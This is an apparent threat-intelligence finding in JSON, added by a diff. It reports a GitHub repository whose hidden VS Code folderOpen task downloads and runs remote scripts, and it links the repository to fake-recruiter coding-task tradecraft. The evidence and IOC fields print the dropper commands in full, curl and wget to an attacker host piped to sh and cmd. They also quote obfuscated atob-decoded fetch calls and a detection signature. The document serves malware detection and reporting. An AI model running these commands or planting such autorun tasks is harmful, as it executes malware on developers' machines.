@@ -1,0 +1,75 @@
+{
+  "finding": {
+    "key": "repository:sabbirnde1/nava",
+    "kind": "repository",
+    "family": "",
+    "id": "sabbirnde1/nava",
+    "url": "https://github.com/Sabbirnde1/Nava",
+    "registry": "github",
+    "owner": "sabbirnde1",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 9,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "install_hook/vscode-autorun; obfuscation/atob",
+    "evidence_locations": ".vscode/tasks.json:0; src/utils/errorHandler.js:38; src/utils/errorHandler.js:43",
+    "c2_hosts": "chvsvr.short.gy",
+    "iocs": "chvsvr.short.gy; https://chvsvr.short.gy/dGVhbTE1m; https://chvsvr.short.gy/dGVhbTE1l; https://chvsvr.short.gy/dGVhbTE1w; curl 'https://chvsvr.short.gy/dGVhbTE1m' -L | sh; .vscode/tasks.json",
+    "matched_signatures": "folderOpen curl filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 9)",
+    "osm_status": "submitted",
+    "osm_threat_id": "96bf7711-9513-4ba1-94f3-9195bd30f540",
+    "first_seen": "hunt-20260702T045701Z",
+    "last_seen": "hunt-20260702T045701Z",
+    "evidence_file": "repositories/sabbirnde1_nava.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://chvsvr.short.gy/dGVhbTE1m' -L | sh wget -qO- 'https://chvsvr.short.gy/dGVhbTE1l' -L | sh curl https://chvsvr.short.gy/dGVhbTE1w -L | cmd"
+    },
+    {
+      "file": "src/utils/errorHandler.js",
+      "line": 38,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "axios.get(atob(BINANCE_KEY)).then("
+    },
+    {
+      "file": "src/utils/errorHandler.js",
+      "line": 43,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "axios.get(atob(KUCOIN_KEY)).then("
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/sabbirnde1/nava",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from chvsvr.short.gy and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: chvsvr.short.gy.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from chvsvr.short.gy and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: chvsvr.short.gy",
+    "publisher": "sabbirnde1",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/sabbirnde1/nava/blob/HEAD/.vscode/tasks.json\nhttps://github.com/sabbirnde1/nava/blob/HEAD/src/utils/errorHandler.js#L38\nhttps://github.com/sabbirnde1/nava/blob/HEAD/src/utils/errorHandler.js#L43",
+    "verified_iocs": "chvsvr.short.gy\nhttps://chvsvr.short.gy/dGVhbTE1m\nhttps://chvsvr.short.gy/dGVhbTE1l\nhttps://chvsvr.short.gy/dGVhbTE1w\ncurl 'https://chvsvr.short.gy/dGVhbTE1m' -L | sh\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-07-02T04:57:01Z",
+    "last_seen": "2026-07-02T04:57:01Z"
+  }
+}
